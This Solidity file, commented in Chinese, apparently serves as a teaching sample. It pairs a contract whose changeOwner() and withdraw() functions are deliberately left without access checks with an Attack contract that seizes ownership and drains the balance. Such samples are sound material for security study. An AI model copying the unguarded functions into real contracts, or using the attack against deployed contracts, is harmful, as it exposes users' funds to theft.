// SPDX-License-Identifier: UNLICENSED
// Solidity code with Improper Access Control vulnerability
// 漏洞名稱: Improper Access Control
// 描述: 此漏洞存在於合約中對關鍵函數（例如變更 owner 與提取資金）的存取控制不足，任何人皆可呼叫這些函式進行惡意操作。
// 攻擊手法說明: 攻擊者可以呼叫 changeOwner() 函數來將自己設為 owner，之後即可呼叫 withdraw() 提取合約內所有資金。

pragma solidity >=0.8.0;

contract VulnerableAccess {
    // 狀態變數：漏控制 owner 變數
    address public owner;  // 漏洞重點：owner 未受到適當存取控制
    
    // 用於記錄接收的 Ether
    uint public funds;
    
    // 建構子：設定部署者為 owner
    constructor() {
        owner = msg.sender;
    }
    
    // 函式：變更 owner
    // 漏洞重點：缺乏存取控制，任何人都可以呼叫此函式
    function changeOwner(address _newOwner) public {
        // 漏洞：沒有使用任何權限檢查
        owner = _newOwner;
    }
    
    // 函式：提取合約所有資金
    // 漏洞重點：同樣缺乏存取控制，任何人都可以將合約餘額提走
    function withdraw() public {
        // 漏洞：沒有檢查 msg.sender 是否為 owner
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // 接收 Ether 的 fallback 功能
    receive() external payable {
        funds += msg.value;
    }
}

// 攻擊合約：用來展示如何利用上面的漏洞進行攻擊
// 注意：由於合約 VulnerableAccess 具有 payable fallback function，
// 因此在 Attack 合約中其建構子參數需透過 address payable 傳入，否則會出現類型轉換錯誤
contract Attack {
    VulnerableAccess public vulnerableContract;

    // 修改此處參數型態為 address payable 以符合合約類型轉換需求
    constructor(address payable _vulnerableAddress) {
        vulnerableContract = VulnerableAccess(_vulnerableAddress);
    }
    
    // 攻擊步驟
    // 1. 呼叫 changeOwner() 將 owner 變更為攻擊者地址
    // 2. 呼叫 withdraw() 提取合約所有資金
    function attack() public {
        // 步驟 1: 變更 owner
        vulnerableContract.changeOwner(msg.sender);
        
        // 步驟 2: 提取所有資金
        vulnerableContract.withdraw();
    }

    // 接收提取的 Ether
    receive() external payable {}
}
